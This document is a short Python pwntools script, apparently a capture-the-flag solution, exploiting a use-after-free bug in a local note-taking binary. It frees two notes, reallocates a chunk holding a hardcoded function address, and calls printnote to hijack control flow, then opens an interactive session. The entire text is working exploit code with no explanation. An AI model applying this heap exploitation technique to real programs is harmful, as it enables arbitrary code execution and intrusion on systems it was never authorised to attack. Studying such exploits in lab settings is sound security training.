from pwn import *

def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

r = process('./use_after_free')
magic = 0x08048986
addnote(32, b"aaaa")
addnote(32, b"ddaa")
delnote(0)
delnote(1)
addnote(8, p32(magic))
printnote(0)
r.interactive()